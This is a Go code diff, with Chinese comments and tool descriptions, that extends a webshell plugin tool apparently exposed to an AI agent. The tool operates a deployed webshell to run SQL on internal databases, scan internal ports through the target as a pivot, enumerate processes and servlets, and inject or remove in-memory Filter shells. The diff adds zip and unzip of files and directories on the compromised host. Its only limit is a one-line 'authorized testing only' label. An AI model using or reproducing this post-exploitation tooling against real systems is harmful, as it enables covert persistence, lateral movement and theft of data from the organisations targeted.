@@ -306,7 +306,7 @@ func (t *ToolSet) webshellPrivesc() actool.CoreTool {
 // 没装 mysql 客户端也能直连数据库、把内存马挂进容器不回写任何文件。
 func (t *ToolSet) webshellPlugin() actool.CoreTool {
 	return writeTool("webshell_plugin",
-		"在已部署的 webshell 上执行插件（等价于控制台插件面板）。op 取值：db_exec(以目标身份直连其内网数据库执行 SQL)/db_probe(探测目标 classpath 上可用的 JDBC 驱动)/net_scan(以目标为跳板扫描内网端口)/net_list(列目标本机 TCP 连接，不依赖 netstat)/proc_list(进程列表，Linux 读 /proc、Windows 走 tasklist)/servlet_list(枚举 Servlet/Filter 注册与映射，看过滤器链与暴露的管理端点)/jar_load(目标机上已有 jar 的动态装载与驱动探测)/screenshot(截屏，headless 服务器会如实报不可用)/memshell_add_filter(注入内存马)/memshell_list(列已注入内存马)/memshell_del(卸载内存马；注入只有 Tomcat/Jetty 有专用路径，Undertow 这类容器已实测拒绝运行期注册 Filter（UT010041），会如实报错，别反复重试)。carrier=java 时同样可用（载荷内已用 JDK 自带 API 重写）：db 若目标 classpath 没驱动，用 jar_path 指向目标机上的驱动 jar（可逗号分隔多个，驱动包常依赖 slf4j），载荷会绕过 DriverManager 直接 driver.connect。授权测试场景专用。",
+		"在已部署的 webshell 上执行插件（等价于控制台插件面板）。op 取值：db_exec(以目标身份直连其内网数据库执行 SQL)/db_probe(探测目标 classpath 上可用的 JDBC 驱动)/net_scan(以目标为跳板扫描内网端口)/net_list(列目标本机 TCP 连接，不依赖 netstat)/proc_list(进程列表，Linux 读 /proc、Windows 走 tasklist)/servlet_list(枚举 Servlet/Filter 注册与映射，看过滤器链与暴露的管理端点)/jar_load(目标机上已有 jar 的动态装载与驱动探测)/screenshot(截屏，headless 服务器会如实报不可用)/zip(把目标上的文件或目录打包，目录递归)/unzip(解包，越界条目会被丢弃)/memshell_add_filter(注入内存马)/memshell_list(列已注入内存马)/memshell_del(卸载内存马；注入只有 Tomcat/Jetty 有专用路径，Undertow 这类容器已实测拒绝运行期注册 Filter（UT010041），会如实报错，别反复重试)。carrier=java 时同样可用（载荷内已用 JDK 自带 API 重写）：db 若目标 classpath 没驱动，用 jar_path 指向目标机上的驱动 jar（可逗号分隔多个，驱动包常依赖 slf4j），载荷会绕过 DriverManager 直接 driver.connect。授权测试场景专用。",
 		obj(map[string]any{
 			"url":         str("webshell 完整 URL"),
 			"password":    str("连接密码"),
@@ -314,7 +314,7 @@ func (t *ToolSet) webshellPlugin() actool.CoreTool {
 			"script_type": str("脚本语言：php / jsp / jspx / asp / aspx / py / node，默认 php"),
 			"carrier":     str("载体：''/script 普通脚本 shell；java Java 动态载荷"),
 			"disguise":    str("可选：响应体伪装链 png/pdf/gif"),
-			"op":          str("插件操作：db_exec / db_probe / net_scan / net_list / proc_list / memshell_add_filter / memshell_list / memshell_del"),
+			"op":          str("插件操作：db_exec / db_probe / net_scan / net_list / proc_list / servlet_list / jar_load / screenshot / zip / unzip / memshell_*"),
 			"db_type":     str("op=db_exec 的库类型：mysql / pgsql / sqlite / sqlserver / oracle"),
 			"host":        str("op=db_exec 的数据库地址（相对目标机）"),
 			"port":        str("op=db_exec 的数据库端口"),
@@ -329,6 +329,8 @@ func (t *ToolSet) webshellPlugin() actool.CoreTool {
 			"gate_value":  str("op=memshell_add_filter 的门禁请求头值"),
 			"filter":      str("op=proc_list 的过滤词（纯数字按 PID 精确匹配，否则按命令行/进程名模糊匹配）"),
 			"jar_path":    str("op=db_exec/jar_load 用：目标机上的 jar 路径（多个用逗号分隔）；db_exec 用它加载 classpath 外的 JDBC 驱动"),
+			"src_path":    str("op=zip/unzip 的源路径：zip 时是被打包的文件或目录，unzip 时是压缩包路径"),
+			"dst_path":    str("op=zip/unzip 的目标路径：zip 时是产出的 .zip 路径，unzip 时是解压目录"),
 			"timeout":     intp("可选：HTTP 超时秒数，默认 60（数据库/扫描可能慢）"),
 		}, "url", "password", "op"),
 		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
@@ -349,6 +351,8 @@ func (t *ToolSet) webshellPlugin() actool.CoreTool {
 				GateValue  string `json:"gate_value"`
 				Filter     string `json:"filter"`
 				JarPath    string `json:"jar_path"`
+				SrcPath    string `json:"src_path"`
+				DstPath    string `json:"dst_path"`
 			}
 			if err := json.Unmarshal(in, &a); err != nil {
 				return actool.Errorf("参数解析失败: " + err.Error()), nil
@@ -362,10 +366,14 @@ func (t *ToolSet) webshellPlugin() actool.CoreTool {
 			a.normalize()
 			// Java 载体只认字节码：先在本地拦掉没有等价实现的插件，别白跑一趟网络
 			if a.Carrier == "java" && !webshell.JavaExtSupported(a.Op) {
-				return actool.Errorf(fmt.Sprintf("Java 载体不支持 %q：可用 db_exec/db_probe/net_scan/net_list/proc_list/servlet_list/jar_load/screenshot/memshell_*（压缩仍是脚本载体专属）", a.Op)), nil
+				return actool.Errorf(fmt.Sprintf("Java 载体不支持 %q：可用 db_exec/db_probe/net_scan/net_list/proc_list/servlet_list/jar_load/screenshot/zip/unzip/memshell_*", a.Op)), nil
 			}
 			// 参数前置校验：这些错误在目标端报出来往往只有一句「执行失败」，看不出是哪错了
 			switch a.Op {
+			case "zip", "unzip":
+				if strings.TrimSpace(a.SrcPath) == "" || strings.TrimSpace(a.DstPath) == "" {
+					return actool.Errorf("op=" + a.Op + " 需要 src_path 与 dst_path"), nil
+				}
 			case "db_exec":
 				if strings.TrimSpace(a.SQL) == "" {
 					return actool.Errorf("op=db_exec 需要 sql"), nil
@@ -390,7 +398,7 @@ func (t *ToolSet) webshellPlugin() actool.CoreTool {
 				DBType: a.DBType, Host: a.Host, Port: a.Port, User: a.User, Pass: a.Pass,
 				DB: a.DB, SQL: a.SQL, ScanHost: a.ScanHost, ScanPorts: a.ScanPorts,
 				FilterName: a.FilterName, GateHeader: a.GateHeader, GateValue: a.GateValue,
-				Cmd: a.Filter, JarPath: a.JarPath,
+				Cmd: a.Filter, JarPath: a.JarPath, SrcPath: a.SrcPath, DstPath: a.DstPath,
 			}
 			res, err := cli.RoundTripExt(a.Op, p)
 			if err != nil {
